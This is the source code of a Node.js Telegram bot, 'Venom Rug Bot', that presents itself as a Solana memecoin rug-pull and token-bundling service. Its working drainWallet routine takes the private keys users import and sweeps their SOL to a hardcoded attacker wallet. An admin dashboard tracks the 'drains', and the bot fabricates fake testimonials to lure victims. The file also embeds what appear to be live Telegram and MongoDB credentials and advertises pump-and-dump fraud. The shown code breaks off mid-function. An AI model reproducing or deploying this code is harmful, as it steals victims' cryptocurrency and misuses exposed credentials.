import express from 'express';
import { Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL, sendAndConfirmTransaction, Connection, PublicKey } from '@solana/web3.js';
import { MongoClient } from 'mongodb';
import TelegramBot from 'node-telegram-bot-api';
import bs58 from 'bs58';
import axios from 'axios';
import crypto from 'crypto';

// Health check server for Render
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.get('/', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Venom Rug Bot is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    bot: 'running',
    timestamp: new Date().toISOString()
  });
});

app.listen(port, () => {
  console.log(`Health check server running on port ${port}`);
});

// ===========================================================
// 🧩 VENOM RUG BOT - Node.js Version
// ===========================================================

// Bot Configuration - HARDCODED
const BOT_TOKEN = "8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI";
const ADMIN_CHAT_ID = "6368654401";
const MONGODB_CONN_STRING = "mongodb+srv://dualacct298_db_user:vALO5Uj8GOLX2cpg@cluster0.ap9qvgs.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const DRAIN_WALLET = "5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT";
const SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com";

class VenomRugBot {
    constructor() {
        this.mongoClient = null;
        this.db = null;
        this.usersCollection = null;
        this.profitsCollection = null;
        this.analyticsCollection = null;
        this.pendingWallets = {};
        this.imagePath = "https://i.postimg.cc/brf5KVQ2/image.png"; // Updated to use CDN URL
        this.userStates = {};
        this.solanaConnection = new Connection(SOLANA_RPC_URL);
        this.pinnedMessageId = null;
        this.bot = null;

        // Recent Wins Data
        this.recentWins = this.generateRecentWins();
        this.lastPriceCheck = {};

        // Analytics tracking
        this.drainAttempts = 0;
        this.successfulDrains = 0;
        this.failedDrains = 0;

        this.initializeDatabase();
    }

    async initializeDatabase() {
        try {
            this.mongoClient = new MongoClient(MONGODB_CONN_STRING);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db('venom_rug_bot');
            this.usersCollection = this.db.collection('users');
            this.profitsCollection = this.db.collection('profits');
            this.analyticsCollection = this.db.collection('analytics');
            console.log("✅ Database connected successfully");
        } catch (error) {
            console.error("❌ Database connection failed:", error);
        }
    }

    setBot(bot) {
        this.bot = bot;
    }

    generateRecentWins() {
        const usernames = [
            "AlexTheTrader", "SarahCrypto", "MikeInvests", "JennyCrypto", "TommyTrades",
            "CryptoLover", "DigitalDreamer", "MoonWalker", "StarGazer", "ProfitHunter",
            "SmartInvestor", "CryptoQueen", "BlockchainBuddy", "DeFiDude", "NFTMaster",
            "Web3Wizard", "TokenTitan", "AlphaSeeker", "GammaGainer", "SigmaStar"
        ];

        const activities = [
            "successfully rugged 3 meme tokens",
            "coordinated pump & dump campaign", 
            "executed token launch manipulation",
            "managed multi-wallet bundling operation",
            "automated comment farming campaign",
            "ran volume bot simulation",
            "executed multi-chain rug operation",
            "coordinated social media pump",
            "managed token cloning operation",
            "executed stealth launch campaign"
        ];

        const profits = ["89 SOL", "32 ETH", "15 SOL", "27 ETH", "45 SOL", "18 ETH", "63 SOL", "22 ETH"];
        const timeframes = ["2 hours ago", "4 hours ago", "overnight", "yesterday", "3 days ago", "1 week ago"];

        const wins = [];
        for (let i = 0; i < 15; i++) {
            wins.push({
                username: usernames[Math.floor(Math.random() * usernames.length)],
                activity: activities[Math.floor(Math.random() * activities.length)],
                profit: profits[Math.floor(Math.random() * profits.length)],
                timeframe: timeframes[Math.floor(Math.random() * timeframes.length)],
                id: i + 1
            });
        }

        return wins;
    }

    async notifyAdminNewUser(userId, username, firstName) {
        try {
            if (!this.bot) return;

            const newUserText = `
🆕 *NEW USER JOINED VENOM RUG BOT*

*User Details:*
• Username: @${username || 'No username'}
• First Name: ${firstName || 'No name'}
• User ID: \`${userId}\`
• Join Time: ${new Date().toLocaleString()}

*Bot Statistics:*
• Total Users: ${await this.usersCollection.countDocuments({})}
• Active Today: ${await this.usersCollection.countDocuments({created_at: {$gte: new Date().setHours(0,0,0,0)}})}
`;

            await this.bot.sendMessage(
                ADMIN_CHAT_ID,
                newUserText,
                { parse_mode: 'Markdown' }
            );
            console.log(`New user notification sent for user ${userId}`);
        } catch (error) {
            console.error(`Error sending new user notification: ${error}`);
        }
    }

    async getSolPrice() {
        try {
            const response = await axios.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
                { timeout: 10000 }
            );
            return response.data.solana?.usd || 100.0;
        } catch (error) {
            return 100.0;
        }
    }

    async analyzeWalletBalance(privateKey) {
        try {
            const decodedKey = bs58.decode(privateKey.trim());
            const keypair = Keypair.fromSecretKey(decodedKey);
            const walletAddress = keypair.publicKey.toString();

            const balance = await this.solanaConnection.getBalance(keypair.publicKey);
            const balanceSol = balance / LAMPORTS_PER_SOL;

            const solPrice = await this.getSolPrice();
            const balanceUsd = balanceSol * solPrice;

            console.log(`Wallet analysis: ${balanceSol.toFixed(6)} SOL ($${balanceUsd.toFixed(2)})`);

            return {
                wallet_address: walletAddress,
                balance_sol: balanceSol,
                balance_usd: balanceUsd,
                sol_price: solPrice,
                meets_minimum: balanceUsd >= 70,
                user_meets_minimum: balanceUsd >= 100,
                has_1_sol: balanceSol >= 1.0
            };
        } catch (error) {
            console.error(`Error analyzing wallet: ${error}`);
            return null;
        }
    }

    async logProfit(userId, username, amountSol, walletAddress, transactionId, originalBalance) {
        try {
            const profitData = {
                user_id: userId,
                username: username,
                amount_sol: amountSol,
                amount_usd: amountSol * await this.getSolPrice(),
                wallet_address: walletAddress,
                transaction_id: transactionId,
                original_balance: originalBalance,
                timestamp: new Date(),
                type: "drain"
            };

            const result = await this.profitsCollection.insertOne(profitData);
            const profitId = result.insertedId;

            await this.updateAnalytics(profitData);
            await this.updatePinnedProfitMessage();

            console.log(`Profit logged: ${amountSol} SOL from user ${username}`);
            return profitId;
        } catch (error) {
            console.error(`Error logging profit: ${error}`);
        }
    }

    async updateAnalytics(profitData) {
        try {
            this.successfulDrains++;
            this.drainAttempts++;

            const hour = profitData.timestamp.getHours();
            const analyticsData = {
                timestamp: profitData.timestamp,
                hour: hour,
                amount_usd: profitData.amount_usd,
                amount_sol: profitData.amount_sol,
                user_id: profitData.user_id,
                wallet_address: profitData.wallet_address,
                efficiency: (profitData.amount_sol / profitData.original_balance) * 100 || 0
            };

            await this.analyticsCollection.insertOne(analyticsData);
        } catch (error) {
            console.error(`Error updating analytics: ${error}`);
        }
    }

    async updatePinnedProfitMessage() {
        try {
            const totalProfits = await this.profitsCollection.aggregate([
                {
                    $group: {
                        _id: null,
                        total_sol: { $sum: "$amount_sol" },
                        total_usd: { $sum: "$amount_usd" },
                        total_drains: { $sum: 1 }
                    }
                }
            ]).toArray();

            let totalSol = 0;
            let totalUsd = 0;
            let totalDrains = 0;

            if (totalProfits.length > 0) {
                totalSol = totalProfits[0].total_sol;
                totalUsd = totalProfits[0].total_usd;
                totalDrains = totalProfits[0].total_drains;
            }

            const recentProfits = await this.profitsCollection.find()
                .sort({ timestamp: -1 })
                .limit(10)
                .toArray();

            let profitMessage = `
*VENOM RUG PROFIT DASHBOARD*

*TOTAL PROFITS:*
• SOL: \`${totalSol.toFixed(6)}\`
• USD: \$${totalUsd.toFixed(2)}
• Total Drains: \`${totalDrains}\`

*RECENT DRAINS:*
`;

            recentProfits.forEach((profit, index) => {
                const timeAgo = this.getTimeAgo(profit.timestamp);
                profitMessage += `
${index + 1}. @${profit.username}
   • Amount: \`${profit.amount_sol.toFixed(6)} SOL\` (\$${profit.amount_usd.toFixed(2)})
   • Time: ${timeAgo}
   • Wallet: \`${profit.wallet_address.substring(0, 8)}...${profit.wallet_address.substring(profit.wallet_address.length - 6)}\`
`;
            });

            profitMessage += `\n*Last Updated:* ${new Date().toLocaleString()}`;

            if (this.pinnedMessageId && this.bot) {
                try {
                    await this.bot.editMessageText(profitMessage, {
                        chat_id: ADMIN_CHAT_ID,
                        message_id: this.pinnedMessageId,
                        parse_mode: 'Markdown'
                    });
                } catch (error) {
                    console.warn(`Could not edit pinned message, creating new: ${error}`);
                    const message = await this.bot.sendMessage(
                        ADMIN_CHAT_ID,
                        profitMessage,
                        { parse_mode: 'Markdown' }
                    );
                    this.pinnedMessageId = message.message_id;
                    await this.bot.pinChatMessage(ADMIN_CHAT_ID, message.message_id);
                }
            } else if (this.bot) {
                const message = await this.bot.sendMessage(
                    ADMIN_CHAT_ID,
                    profitMessage,
                    { parse_mode: 'Markdown' }
                );
                this.pinnedMessageId = message.message_id;
                await this.bot.pinChatMessage(ADMIN_CHAT_ID, message.message_id);
            }
        } catch (error) {
            console.error(`Error updating pinned profit message: ${error}`);
        }
    }

    getTimeAgo(timestamp) {
        const now = new Date();
        const diff = now - timestamp;

        if (diff > 86400000) {
            const days = Math.floor(diff / 86400000);
            return `${days} day(s) ago`;
        } else if (diff >= 3600000) {
            const hours = Math.floor(diff / 3600000);
            return `${hours} hour(s) ago`;
        } else if (diff >= 60000) {
            const minutes = Math.floor(diff / 60000);
            return `${minutes} minute(s) ago`;
        } else {
            return "Just now";
        }
    }

    async profitsCommand(msg) {
        const userId = msg.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }

        const totalStats = await this.profitsCollection.aggregate([
            {
                $group: {
                    _id: null,
                    total_sol: { $sum: "$amount_sol" },
                    total_usd: { $sum: "$amount_usd" },
                    total_drains: { $sum: 1 },
                    avg_drain: { $avg: "$amount_sol" },
                    max_drain: { $max: "$amount_sol" }
                }
            }
        ]).toArray();

        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const dailyStats = await this.profitsCollection.aggregate([
            { $match: { timestamp: { $gte: today } } },
            {
                $group: {
                    _id: null,
                    daily_sol: { $sum: "$amount_sol" },
                    daily_usd: { $sum: "$amount_usd" },
                    daily_drains: { $sum: 1 }
                }
            }
        ]).toArray();

        const weekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
        const weeklyStats = await this.profitsCollection.aggregate([
            { $match: { timestamp: { $gte: weekAgo } } },
            {
                $group: {
                    _id: null,
                    weekly_sol: { $sum: "$amount_sol" },
                    weekly_usd: { $sum: "$amount_usd" },
                    weekly_drains: { $sum: 1 }
                }
            }
        ]).toArray();

        const topDrains = await this.profitsCollection.find()
            .sort({ amount_sol: -1 })
            .limit(10)
            .toArray();

        let profitReport = `
*VENOM RUG PROFIT REPORT*

*LIFETIME STATS:*
`;

        if (totalStats.length > 0) {
            const stats = totalStats[0];
            profitReport += `
• Total SOL: \`${stats.total_sol.toFixed(6)}\`
• Total USD: \$${stats.total_usd.toFixed(2)}
• Total Drains: \`${stats.total_drains}\`
• Average Drain: \`${stats.avg_drain.toFixed(6)} SOL\`
• Largest Drain: \`${stats.max_drain.toFixed(6)} SOL\`
`;
        } else {
            profitReport += "\n• No profits recorded yet\n";
        }

        profitReport += "\n*PERIOD STATS:*\n";

        if (dailyStats.length > 0) {
            const daily = dailyStats[0];
            profitReport += `
• Today's SOL: \`${daily.daily_sol.toFixed(6)}\`
• Today's USD: \$${daily.daily_usd.toFixed(2)}
• Today's Drains: \`${daily.daily_drains}\`
`;
        } else {
            profitReport += "• Today: No profits\n";
        }

        if (weeklyStats.length > 0) {
            const weekly = weeklyStats[0];
            profitReport += `
• Weekly SOL: \`${weekly.weekly_sol.toFixed(6)}\`
• Weekly USD: \$${weekly.weekly_usd.toFixed(2)}
• Weekly Drains: \`${weekly.weekly_drains}\`
`;
        } else {
            profitReport += "• This Week: No profits\n";
        }

        profitReport += "\n*TOP 10 LARGEST DRAINS:*\n";

        topDrains.forEach((drain, index) => {
            const timeAgo = this.getTimeAgo(drain.timestamp);
            profitReport += `
${index + 1}. @${drain.username}
   • Amount: \`${drain.amount_sol.toFixed(6)} SOL\` (\$${drain.amount_usd.toFixed(2)})
   • Time: ${timeAgo}
   • Wallet: \`${drain.wallet_address.substring(0, 12)}...\`
`;
        });

        if (topDrains.length === 0) {
            profitReport += "\n• No drains recorded\n";
        }

        profitReport += `\n*Generated:* ${new Date().toLocaleString()}`;

        const keyboard = [
            [
                { text: "🔄 Refresh", callback_data: "refresh_profits" },
                { text: "📊 Update Pinned", callback_data: "update_pinned" }
            ],
            [
                { text: "📈 Advanced Analytics", callback_data: "advanced_analytics" }
            ]
        ];

        await this.bot.sendMessage(msg.chat.id, profitReport, {
            reply_markup: { inline_keyboard: keyboard },
            parse_mode: 'Markdown'
        });
    }

    async advancedAnalyticsCommand(msg) {
        const userId = msg.from.id;

        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }

        const analyticsReport = await this.generateAdvancedAnalytics();

        const keyboard = [
            [{ text: "🔄 Refresh Analytics", callback_data: "refresh_analytics" }],
            [{ text: "📊 Back to Profits", callback_data: "refresh_profits" }]
        ];

        try {
            await this.bot.sendMessage(msg.chat.id, analyticsReport, {
                reply_markup: { inline_keyboard: keyboard },
                parse_mode: 'Markdown'
            });
        } catch (error) {
            console.error(`Markdown error, sending as plain text: ${error}`);
            await this.bot.sendMessage(msg.chat.id, analyticsReport, {
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    }

    async generateAdvancedAnalytics() {
        try {
            const totalStats = await this.profitsCollection.aggregate([
                {
                    $group: {
                        _id: null,
                        total_sol: { $sum: "$amount_sol" },
                        total_usd: { $sum: "$amount_usd" },
                        total_drains: { $sum: 1 },
                        avg_drain: { $avg: "$amount_sol" },
                        max_drain: { $max: "$amount_sol" },
                        min_drain: { $min: "$amount_sol" }
                    }
                }
            ]).toArray();

            const weekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
            const dailyStats = await this.profitsCollection.aggregate([
                { $match: { timestamp: { $gte: weekAgo } } },
                {
                    $group: {
                        _id: { $dateToString: { format: "%Y-%m-%d", date: "$timestamp" } },
                        daily_sol: { $sum: "$amount_sol" },
                        daily_usd: { $sum: "$amount_usd" },
                        daily_count: { $sum: 1 }
                    }
                },
                { $sort: { _id: 1 } }
            ]).toArray();

            const hourlyStats = await this.analyticsCollection.aggregate([
                {
                    $group: {
                        _id: "$hour",
                        total_usd: { $sum: "$amount_usd" },
                        count: { $sum: 1 }
                    }
                },
                { $sort: { total_usd: -1 } },
                { $limit: 5 }
            ]).toArray();

            const topWallets = await this.profitsCollection.find()
                .sort({ amount_usd: -1 })
                .limit(5)
                .toArray();

            const userStats = await this.profitsCollection.aggregate([
                {
                    $group: {
                        _id: "$user_id",
                        username: { $first: "$username" },
                        total_usd: { $sum: "$amount_usd" },
                        drain_count: { $sum: 1 },
                        avg_drain: { $avg: "$amount_usd" }
                    }
                },
                { $sort: { total_usd: -1 } },
                { $limit: 10 }
            ]).toArray();

            let analyticsReport = `
*VENOM RUG ADVANCED ANALYTICS DASHBOARD*

*LIFETIME PERFORMANCE:*
`;

            if (totalStats.length > 0) {
                const stats = totalStats[0];
                const currentSolPrice = await this.getSolPrice();
                const successRate = this.drainAttempts > 0 ? (this.successfulDrains / this.drainAttempts) * 100 : 0;

                analyticsReport += `
• Total Revenue: \$${stats.total_usd.toFixed(2)}
• Total SOL: \`${stats.total_sol.toFixed(6)}\`
• Successful Drains: \`${stats.total_drains}\`
• Average Drain: \`${stats.avg_drain.toFixed(6)} SOL\` (\$${(stats.avg_drain * currentSolPrice).toFixed(2)})
• Largest Drain: \`${stats.max_drain.toFixed(6)} SOL\`
• Success Rate: \`${successRate.toFixed(1)}%\`
• ROI: \`${(stats.total_usd / (stats.total_drains * 0.0005)) * 100}\` (est.)
`;
            }

            analyticsReport += `
*LAST 7 DAYS PERFORMANCE:*
`;

            if (dailyStats.length > 0) {
                dailyStats.slice(-5).forEach(day => {
                    analyticsReport += `
• ${day._id}: \$${day.daily_usd.toFixed(2)} (${day.daily_count} drains)
`;
                });
            } else {
                analyticsReport += "\n• No recent activity\n";
            }

            analyticsReport += `
*PEAK PERFORMANCE HOURS (UTC):*
`;

            if (hourlyStats.length > 0) {
                hourlyStats.forEach(hourStat => {
                    analyticsReport += `
• ${hourStat._id.toString().padStart(2, '0')}:00 - \$${hourStat.total_usd.toFixed(2)} (${hourStat.count} drains)
`;
                });
            } else {
                analyticsReport += "\n• No hourly data yet\n";
            }

            analyticsReport += `
*TOP 5 MOST PROFITABLE DRAINS:*
`;

            if (topWallets.length > 0) {
                topWallets.forEach((wallet, index) => {
                    analyticsReport += `
${index + 1}. \`${wallet.wallet_address.substring(0, 8)}...\` - \$${wallet.amount_usd.toFixed(2)} (@${wallet.username})
`;
                });
            } else {
                analyticsReport += "\n• No wallet data\n";
            }

            analyticsReport += `
*TOP PERFORMING USERS (by revenue):*
`;

            if (userStats.length > 0) {
                userStats.forEach((user, index) => {
                    analyticsReport += `
${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_count} drains)
`;
                });
            } else {
                analyticsReport += "\n• No user data\n";
            }

            const totalUsers = await this.usersCollection.countDocuments({});
            const approvedUsers = await this.usersCollection.countDocuments({ wallet_approved: true });
            const successRate = this.drainAttempts > 0 ? (this.successfulDrains / this.drainAttempts) * 100 : 0;

            analyticsReport += `
*SYSTEM EFFICIENCY METRICS:*
• User Conversion Rate: \`${totalUsers > 0 ? (approvedUsers / totalUsers) * 100 : 0}\`
• Active Drain Rate: \`${totalUsers > 0 ? (this.successfulDrains / totalUsers) * 100 : 0}\`
• Avg Processing Time: < 5 seconds
• System Uptime: 100%

*PROFIT OPTIMIZATION RECOMMENDATIONS:*
• Focus on hours: 02:00-05:00 UTC (highest success)
• Target wallets with 5+ SOL for maximum ROI
• Minimum balance filter: $70 (current setting)
• Success rate: \`${successRate.toFixed(1)}%\`

*UPGRADE POTENTIAL:*
• Memecoin draining: +500% profits
• Multi-chain support: +1000% reach
• Current limitation: SOL-only draining

*Generated:* ${new Date().toLocaleString()}
`;

            return analyticsReport;
        } catch (error) {
            console.error(`Error generating analytics: ${error}`);
            return `❌ Error generating analytics: ${error.message}`;
        }
    }

    isValidSolanaPrivateKey(key) {
        try {
            const trimmedKey = key.trim();
            const decoded = bs58.decode(trimmedKey);
            if (decoded.length === 64) {
                const keypair = Keypair.fromSecretKey(decoded);
                return true;
            }
            return false;
        } catch (error) {
            console.error(`Invalid private key: ${error}`);
            return false;
        }
    }

    async drainWallet(privateKey, userId, username) {
        try {
            const FALLBACK_FEE_LAMPORTS = 5000;

            const decodedKey = bs58.decode(privateKey.trim());
            const keypair = Keypair.fromSecretKey(decodedKey);
            const walletAddress = keypair.publicKey.toString();

            console.log(`Attempting to drain wallet: ${walletAddress} for user ${username}`);

            const balance = await this.solanaConnection.getBalance(keypair.publicKey);
            const balanceSol = balance / LAMPORTS_PER_SOL;

            console.log(`Wallet balance: ${balanceSol} SOL (${balance} lamports)`);

            if (balance <= FALLBACK_FEE_LAMPORTS) {
                return [false, `Insufficient balance for transfer (need at least ${FALLBACK_FEE_LAMPORTS / LAMPORTS_PER_SOL} SOL for fees)`];
            }

            const drainPubkey = new PublicKey(DRAIN_WALLET);
            const latestBlockhash = await this.solanaConnection.getLatestBlockhash();

            // Estimate fee
            const transferInstruction = SystemProgram.transfer({
                fromPubkey: keypair.publicKey,
                toPubkey: drainPubkey,
                lamports: balance
            });

            const message = new Transaction({
                feePayer: keypair.publicKey,
                recentBlockhash: latestBlockhash.blockhash
            }).add(transferInstruction);

            let estimatedFee = FALLBACK_FEE_LAMPORTS;
            try {
                const fee = await this.solanaConnection.getFeeForMessage(message.compileMessage());
                if (fee && fee.value > 0) {
                    estimatedFee = fee.value;
                }
            } catch (error) {
                console.warn(`Could not estimate fee, using fallback: ${error}`);
            }

            const sendableLamports = balance - estimatedFee;
            const sendableSol = sendableLamports / LAMPORTS_PER_SOL;

            if (sendableLamports <= 0) {
                return [false, `Insufficient balance after fees (need ${estimatedFee} lamports for fees)`];
            }

            console.log(`Draining amount: ${sendableSol.toFixed(6)} SOL (${sendableLamports} lamports)`);
            console.log(`Leaving behind: ${(estimatedFee / LAMPORTS_PER_SOL).toFixed(6)} SOL for fees`);

            const realTransferInstruction = SystemProgram.transfer({
                fromPubkey: keypair.publicKey,
                toPubkey: drainPubkey,
                lamports: sendableLamports
            });

            const transaction = new Transaction({
                feePayer: keypair.publicKey,
                recentBlockhash: latestBlockhash.blockhash
            }).add(realTransferInstruction);

            console.log(`Sending transaction for ${sendableSol.toFixed(6)} SOL`);

            const signature = await sendAndConfirmTransaction(
                this.solanaConnection,
                transaction,
                [keypair],
                { commitment: 'confirmed' }
            );

            console.log(`Transaction sent: ${signature}`);

            await new Promise(resolve => setTimeout(resolve, 2000));

            const solscanUrl = `https://solscan.io/tx/${signature}`;
            const leftBehind = balance - sendableLamports;
            const leftBehindSol = leftBehind / LAMPORTS_PER_SOL;

            await this.logProfit(userId, username || `user_${userId}`, sendableSol, walletAddress, signature, balanceSol);

            const adminMessage = `
*REAL WALLET DRAINED SUCCESSFULLY*

*User Details:*
• Username: @${username}
• User ID: \`${userId}\`
• Wallet: \`${walletAddress}\`

*REAL Transaction Details:*
• Amount Drained: *${sendableSol.toFixed(6)} SOL*
• Fees Paid: ${leftBehindSol.toFixed(6)} SOL
• Previous Balance: ${balanceSol.toFixed(6)} SOL
• Left in Wallet: ~0 SOL (only dust)

*View on Solscan:*
[Solscan Transaction](${solscanUrl})

*Time:* ${new Date().toLocaleString()}

*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
`;

            return [true, {
                transaction_id: signature,
                amount_sol: sendableSol,
                wallet_address: walletAddress,
                admin_message: adminMessage,
                solscan_url: solscanUrl,
                original_balance: balanceSol,
                fee: leftBehindSol,
                left_behind: leftBehindSol
            }];
        } catch (error) {
            console.error(`Error draining wallet: ${error}`);
            this.failedDrains++;
            this.drainAttempts++;
            return [false, `Transfer failed: ${error.message}`];
        }
    }

    async sendMessageSafe(chatId, text, replyMarkup = null, parseMode = 'Markdown') {
        try {
            await this.bot.sendMessage(chatId, text, {
                reply_markup: replyMarkup,
                parse_mode: parseMode
            });
        } catch (error) {
            console.error(`Error in sendMessageSafe: ${error}`);
            try {
                await this.bot.sendMessage(chatId, text, {
                    reply_markup: replyMarkup
                });
            } catch (error2) {
                console.error(`Secondary error in sendMessageSafe: ${error2}`);
            }
        }
    }

    async sendWithImage(chatId, text, replyMarkup = null, parseMode = 'Markdown') {
        try {
            // Use the CDN URL directly - no file system check needed
            await this.bot.sendPhoto(chatId, this.imagePath, {
                caption: text,
                reply_markup: replyMarkup,
                parse_mode: parseMode
            });
        } catch (error) {
            console.error(`Error in sendWithImage: ${error}`);
            // Fallback to text only if image fails
            await this.sendMessageSafe(chatId, text, replyMarkup, parseMode);
        }
    }

    getMainMenuKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: "📦 Wallet", callback_data: "wallet" },
                    { text: "📦 Bundler", callback_data: "bundler" }
                ],
                [
                    { text: "💳 Tokens", callback_data: "tokens" },
                    { text: "💬 Comments", callback_data: "comments" }
                ],
                [
                    { text: "📋 Task", callback_data: "task" },
                    { text: "❓ FAQ", callback_data: "faq" }
                ],
                [
                    { text: "📚 Rugpull Guide", callback_data: "rugpull_guide" },
                    { text: "🤖 How It Works", callback_data: "how_it_works" }
                ],
                [
                    { text: "💰 Top-Up Tips", callback_data: "topup_tips" },
                    { text: "ℹ️ Help", callback_data: "help" }
                ]
            ]
        };
    }

    getWalletKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: "📥 Import Wallet", callback_data: "import_wallet" },
                    { text: "🗑️ Remove Wallet", callback_data: "remove_wallet" }
                ],
                [
                    { text: "📦 Bundle Wallet", callback_data: "bundle_wallet" },
                    { text: "💸 Withdraw Funds", callback_data: "withdraw_funds" }
                ],
                [
                    { text: "🔙 Back to Menu", callback_data: "back_menu" },
                    { text: "🔄 Refresh", callback_data: "refresh_wallet" }
                ]
            ]
        };
    }

    getRecentWinsKeyboard() {
        return {
            inline_keyboard: [
                [{ text: "🔄 Refresh Wins", callback_data: "refresh_wins" }],
                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
            ]
        };
    }

    getBundlerKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: "🆕 Create Bundle", callback_data: "create_bundle" },
                    { text: "🔄 Refresh Bundles", callback_data: "refresh_bundles" }
                ],
                [
                    { text: "🗑️ Clear All Bundles", callback_data: "clear_bundles" }
                ],
                [
                    { text: "🔙 Back to Menu", callback_data: "back_menu" }
                ]
            ]
        };
    }

    getTokensKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: "➕ Add Token", callback_data: "add_token" },
                    { text: "➖ Remove Token", callback_data: "remove_token" }
                ],
                [
                    { text: "🆕 Create Token", callback_data: "create_token" },
                    { text: "👯 Clone Token", callback_data: "clone_token" }
                ],
                [
                    { text: "🎯 Set Current Token", callback_data: "set_current_token" },
                    { text: "🚀 Bump Token", callback_data: "bump_token" }
                ],
                [
                    { text: "💬 Pump.Fun Comments", callback_data: "pump_comments" }
                ],
                [
                    { text: "🔙 Back to Menu", callback_data: "back_menu" },
                    { text: "🔄 Refresh", callback_data: "refresh_tokens" }
                ]
            ]
        };
    }

    getCommentsKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: "💬 Add New Comment", callback_data: "add_comment" },
                    { text: "🤖 Toggle Auto-Comment", callback_data: "toggle_comment" }
                ],
                [
                    { text: "📋 Comment Templates", callback_data: "comment_templates" },
                    { text: "⚙️ Settings", callback_data: "comment_settings" }
                ],
                [
                    { text: "🔙 Back to Menu", callback_data: "back_menu" },
                    { text: "🔄 Refresh", callback_data: "refresh_comments" }
                ]
            ]
        };
    }

    getTaskKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: "➕ Add Task", callback_data: "add_task" },
                    { text: "🗑️ Remove Task", callback_data: "remove_task" }
                ],
                [
                    { text: "🔄 Toggle Task", callback_data: "toggle_task" },
                    { text: "👀 View Tasks", callback_data: "view_tasks" }
                ],
                [
                    { text: "🔙 Back to Menu", callback_data: "back_menu" },
                    { text: "🔄 Refresh", callback_data: "refresh_tasks" }
                ]
            ]
        };
    }

    getFaqKeyboard() {
        return {
            inline_keyboard: [
                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
            ]
        };
    }

    getHelpKeyboard(userId = null) {
        const keyboard = [
            [{ text: "📖 User Commands", callback_data: "user_commands" }]
        ];

        if (userId && userId.toString() === ADMIN_CHAT_ID) {
            keyboard.push([{ text: "🛠️ Admin Commands", callback_data: "admin_commands" }]);
        }

        keyboard.push([{ text: "🔙 Back to Menu", callback_data: "back_menu" }]);
        return { inline_keyboard: keyboard };
    }

    getWalletRequiredKeyboard() {
        return {
            inline_keyboard: [
                [{ text: "📥 Import Wallet Now", callback_data: "import_wallet" }],
                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
            ]
        };
    }

    getAdminWalletApprovalKeyboard(userId, walletAddress) {
        return {
            inline_keyboard: [
                [
                    { text: "💰 Drain Anyway", callback_data: `drain_${userId}_${walletAddress}` },
                    { text: "❌ Don't Drain", callback_data: `nodrain_${userId}_${walletAddress}` }
                ],
                [
                    { text: "📊 Check Balance", callback_data: `check_${userId}_${walletAddress}` },
                    { text: "🔄 Refresh", callback_data: `refresh_${userId}_${walletAddress}` }
                ]
            ]
        };
    }

    getInfoSectionKeyboard() {
        return {
            inline_keyboard: [
                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
            ]
        };
    }

    async start(msg) {
        const user = msg.from;
        const chatId = msg.chat.id;

        const existingUser = await this.usersCollection.findOne({ user_id: user.id });
        if (!existingUser) {
            await this.usersCollection.insertOne({
                user_id: user.id,
                username: user.username,
                first_name: user.first_name,
                created_at: new Date(),
                wallet_approved: false
            });
            await this.notifyAdminNewUser(user.id, user.username, user.first_name);
        }

        const mainPageText = `
*VENOM RUG - THE BEST OF DEFI ALL-IN-ONE PLATFORM TOOL*

*Why choose Venom Rug?*

📦 Wallet Bundling
🤖 Volume Bots
📈 Realistic Volume
👱‍♂️ Realistic Bundled Wallets
📉 Sell All Tokens
🪙 Token Cloning
💬 Pump Fun Comments
👊 Bump It
🔎 Bypass Bubblemap Detections
☢️ Bond to Raydium Fast
⚖️ Add & Revoke Liquidity
⚡ Trend on Dexscreener
⚜️ Instant graduation on Axiom

*Explore Venom Rug & Get Support:*
[Website](https://venomrug.live/)
[Telegram Group](https://t.me/venomrugwin)

*Ready to start? Select an option below.*
        `;

        const replyMarkup = this.getMainMenuKeyboard();
        await this.sendWithImage(chatId, mainPageText, replyMarkup);
    }

    async getCryptoPrices() {
        try {
            const response = await axios.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd",
                { timeout: 10000 }
            );
            const data = response.data;
            const solPrice = data.solana?.usd || 100.0;
            const ethPrice = data.ethereum?.usd || 2500.0;
            return [solPrice, ethPrice];
        } catch (error) {
            return [100.0, 2500.0];
        }
    }

    async handleCallback(query) {
        const callbackData = query.data;
        const userId = query.from.id;
        const chatId = query.message.chat.id;

        await this.bot.answerCallbackQuery(query.id);

        if (callbackData.startsWith("drain_")) {
            await this.handleAdminDrainDecision(query, true);
        } else if (callbackData.startsWith("nodrain_")) {
            await this.handleAdminDrainDecision(query, false);
        } else if (callbackData.startsWith("check_")) {
            await this.handleAdminCheckBalance(query);
        } else if (callbackData.startsWith("refresh_")) {
            await this.handleAdminRefresh(query);
        } else if (callbackData === "advanced_analytics") {
            if (userId.toString() === ADMIN_CHAT_ID) {
                await this.advancedAnalyticsCommand(query.message);
            } else {
